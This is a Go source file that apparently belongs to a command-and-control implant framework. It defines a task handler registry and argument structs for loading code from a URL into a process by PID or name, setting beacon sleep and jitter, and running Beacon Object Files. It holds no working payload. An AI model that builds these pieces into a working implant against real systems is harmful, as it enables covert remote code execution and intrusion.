package tasks

import (
	"strconv"

	"github.com/carved4/carved/shared/proto"
)

type Handler func(task *proto.Task) *proto.TaskResult

type Registry map[proto.TaskType]Handler

type ExecuteArgs struct {
	Method string `json:"method"`
}

type LoadArgs struct {
	URL     string `json:"url,omitempty"`
	Export  string `json:"export,omitempty"`
	PID     uint32 `json:"pid,omitempty"`
	Process string `json:"process,omitempty"`
}

type SleepArgs struct {
	Sleep  uint32 `json:"sleep"`
	Jitter uint8  `json:"jitter"`
}

type BOFArgs struct {
	URL   string `json:"url,omitempty"`
	Entry string `json:"entry,omitempty"`
}

func parseUint32(s string) (uint32, error) {
	v, err := strconv.ParseUint(s, 10, 32)
	return uint32(v), err
}
